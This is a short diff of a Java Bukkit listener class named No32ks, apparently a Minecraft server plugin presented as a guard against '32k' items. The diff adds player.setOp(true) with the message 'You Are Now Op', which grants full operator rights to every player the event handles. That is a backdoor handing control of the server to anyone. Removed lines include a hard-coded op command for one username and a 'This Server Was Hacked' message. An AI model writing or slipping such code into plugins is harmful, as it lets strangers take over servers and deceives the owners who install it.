@@ -20,18 +20,13 @@ public class No32ks implements Listener {
 		
 		Player player =(Player) evant.getPlayer();
 		
-        player.sendMessage("§6[No32ks] You're Server Has No 32ks");
-	    Bukkit.getPluginCommand("op enderchickenbawk");
+        player.sendMessage("§6[AutoOp] You Are Now Op");
+	    //Bukkit.getPluginCommand("op enderchickenbawk");
 
-      //  player.setOp(true);
-		//player.sendMessage("OPME");
-		//evant.getPlayer().sendMessage("&6This Server Was Hacked");
-		//evant.getPlayer().isOp();
-		//		ItemStack item = new ItemStack(1, Material.BEDROCK);
+        player.setOp(true);
 
-		ItemStack item = new ItemStack(Material.BEDROCK, 127);
 				
-		player.getInventory().addItem(item);
+		//player.getInventory().addItem(item);
 
 
 		
